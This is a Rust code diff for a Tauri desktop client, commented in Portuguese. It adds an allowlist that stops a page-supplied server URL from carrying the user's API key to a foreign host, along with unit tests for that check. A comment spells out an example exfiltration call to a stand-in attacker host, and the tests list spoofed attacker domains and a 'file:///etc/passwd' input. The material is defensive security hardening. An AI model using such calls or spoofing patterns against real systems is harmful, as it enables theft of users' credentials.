@@ -25,7 +25,7 @@ use tauri::{Manager, WebviewWindow};
 use tauri_plugin_notification::NotificationExt;
 
 /// Token de capacidade da sessão do app. É injetado SOMENTE nas páginas do host
-/// canônico (`ia.blue3.com.br`, via `on_page_load`) dentro do shim da ponte, e
+/// canônico (um dos `SERVER_HOSTS`, via `on_page_load`) dentro do shim da ponte, e
 /// TODA mensagem página→Rust precisa carregá-lo em `__t`.
 ///
 /// Fecha o furo do handler nativo ser alcançável por QUALQUER frame: o
@@ -290,7 +290,7 @@ pub fn handle_message(window: &WebviewWindow, payload: &str) {
         Ok(v) => v,
         Err(_) => return,
     };
-    // Cap de capacidade: só a página injetada em ia.blue3.com.br conhece o token
+    // Cap de capacidade: só a página injetada num host de SERVER_HOSTS conhece o token
     // de sessão. Um <iframe> cross-origin embutido alcança o messageHandler
     // nativo mas não tem o token → descartado (silêncio, sem oráculo). Cobre os
     // 3 SOs num só ponto, sem depender de API de origem de frame.
@@ -335,6 +335,20 @@ pub fn handle_message(window: &WebviewWindow, payload: &str) {
     }
 }
 
+/// `true` se `url` for um endereço https de um host do servidor do ShvIA
+/// (`crate::SERVER_HOSTS`). Usada para validar o campo `url` que a PÁGINA manda no
+/// `spawn` — a mesma allowlist exata de `is_internal` e de
+/// `windows_ipc::ALLOWED_MESSAGE_ORIGINS`, para o perímetro ter uma resposta só.
+///
+/// Compara HOST parseado, nunca prefixo de string: `starts_with` deixaria passar
+/// `https://ai.shvia.org.atacante.tld`, que é outro domínio.
+fn url_do_servidor(url: &str) -> bool {
+    match url.parse::<tauri::Url>() {
+        Ok(u) => u.scheme() == "https" && u.host_str().is_some_and(crate::is_server_host),
+        Err(_) => false,
+    }
+}
+
 fn spawn(window: &WebviewWindow, req: &str, v: &serde_json::Value) {
     let s = |k: &str| v.get(k).and_then(|x| x.as_str()).unwrap_or_default().to_string();
     let dir = s("projectDir");
@@ -359,6 +373,28 @@ fn spawn(window: &WebviewWindow, req: &str, v: &serde_json::Value) {
     let mut cmd = Command::new(bin);
     cmd.current_dir(&dir);
     let (model, effort, url, key) = (s("model"), s("effort"), s("url"), s("apiKey"));
+
+    // `url` vem da PÁGINA e viaja junto com SHVIA_API_KEY (a chave do usuário) —
+    // então é entrada não confiável no caminho de um segredo, e passa pela MESMA
+    // allowlist do resto do perímetro (`crate::SERVER_HOSTS`). Sem esta checagem,
+    // um XSS na página do ShvIA — ou um asset de terceiro comprometido; a CSP do
+    // web nasce DESLIGADA (SHVIA-WEB/config/security.php) — chamaria
+    // `__shviaCode.spawn({url:'https://coletor.atacante.tld', apiKey:'…'})` e o
+    // agente mandaria a chave em `X-API-Key` para lá. O anna só exige https, e
+    // https qualquer atacante tem.
+    //
+    // Rejeitar é seguro para o uso legítimo: o web manda `location.origin`
+    // (code-mode.js), e uma página que roda num host do servidor tem, por
+    // definição, origem que passa. Falha ALTO em vez de cair no default
+    // compilado — silenciar mandaria o turno para o host errado sem sintoma.
+    if !url.is_empty() && !url_do_servidor(&url) {
+        return reply(
+            window,
+            req,
+            false,
+            serde_json::json!({ "error": "url de servidor não autorizada" }),
+        );
+    }
     if is_claude {
         // Assinatura via cliente oficial: passa só a pasta do projeto. NADA de
         // SHVIA_API_KEY / --url / --effort (não passa pelo gateway). O modelo é o
@@ -543,6 +579,34 @@ fn sanitize_filename(nome: &str) -> String {
         "arquivo".to_string()
     } else {
         limpo
+    }
+}
+
+#[cfg(test)]
+mod tests_url_servidor {
+    use super::url_do_servidor;
+
+    /// O caminho legítimo: o web manda `location.origin` da página do ShvIA.
+    #[test]
+    fn origens_do_servidor_passam() {
+        assert!(url_do_servidor("https://ai.shvia.org"));
+        assert!(url_do_servidor("https://ia.shvia.org"));
+        assert!(url_do_servidor("https://ia.blue3.com.br"));
+    }
+
+    /// `url` viaja junto com SHVIA_API_KEY: um host de fora aqui é exfiltração da
+    /// chave do usuário. Nada além do servidor entra, nem por sufixo, nem por
+    /// esquema fraco, nem o ápex (que é a landing, em outro IP).
+    #[test]
+    fn qualquer_outra_coisa_e_rejeitada() {
+        assert!(!url_do_servidor("https://coletor.atacante.tld"));
+        assert!(!url_do_servidor("https://ai.shvia.org.atacante.tld"));
+        assert!(!url_do_servidor("https://shvia.org"));
+        assert!(!url_do_servidor("https://evil.shvia.org"));
+        assert!(!url_do_servidor("http://ai.shvia.org")); // sem TLS
+        assert!(!url_do_servidor("file:///etc/passwd"));
+        assert!(!url_do_servidor("nao-e-url"));
+        assert!(!url_do_servidor(""));
     }
 }
 
